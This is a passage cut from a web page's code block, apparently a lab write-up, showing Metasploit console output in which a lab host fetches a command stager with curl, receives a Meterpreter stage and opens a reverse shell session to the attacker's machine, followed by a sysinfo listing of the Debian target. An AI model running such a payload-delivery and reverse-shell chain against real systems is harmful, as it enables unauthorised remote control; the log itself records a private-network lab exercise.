http://0.0.0.0:8080/PDeRPN1t\n[*] Local IP: http://192.168.137.128:8080/PDeRPN1t\n[*] Client 192.168.137.129 (curl/7.52.1) requested /PDeRPN1t\n[*] Sending payload to 192.168.137.129 (curl/7.52.1)\n[*] Sending stage (985320 bytes) to 192.168.137.129\n[*] Meterpreter session 18 opened (192.168.137.128:4444 -&gt; 192.168.137.129:48604) at 2020-03-29 00:23:13 +0800\n[*] Command Stager progress - 100.00% done (149/149 bytes)\n[*] Server stopped.\n\nmeterpreter &gt; sysinfo\nComputer     : 192.168.137.129\nOS           : Debian 9.11 (Linux 4.9.0-11-amd64)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9d36777a-51f5-5a93-9005-ee45bb1a3d89"}}}